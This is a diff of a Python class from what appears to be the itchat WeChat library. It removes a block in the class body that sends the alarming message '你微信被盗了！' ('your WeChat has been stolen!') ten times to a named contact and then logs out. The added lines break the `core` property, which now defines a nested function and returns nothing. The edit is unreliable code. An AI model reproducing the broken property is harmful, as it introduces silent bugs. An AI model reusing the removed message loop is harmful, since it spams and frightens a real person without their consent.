@@ -26,9 +26,10 @@ def check_login(self, uuid=None):
         self.__setstate__(None)
     @property
     def core(self):
-        return getattr(self, '_core', lambda: fakeItchat)() or fakeItchat
+        def fakeItchat():
+            return getattr(self, '_core', lambda: fakeItchat)() or fakeItchat
     @core.setter
-    def core(self, value):
+    def core(self, value=False):
         self._core = ref(value)
     def set_default_value(self, initFunction=None, contactClass=None):
         if hasattr(initFunction, '__call__'):
@@ -57,10 +58,5 @@ def check_login(self, uuid=None):
     def __repr__(self):
         return '<%s: %s>' % (self.__class__.__name__.split('.')[-1],
             self.__str__())
-    user=itchat.search_friends(nickName='思尔孚杨老师')[0]
-    for i in range(10):
-        itchat.send_msg(msg="你微信被盗了！",toUserName=user['UserName'])
-    time.sleep(5)
-    itchat.logout()
     def logout(self):
         raise NotImplementedError()
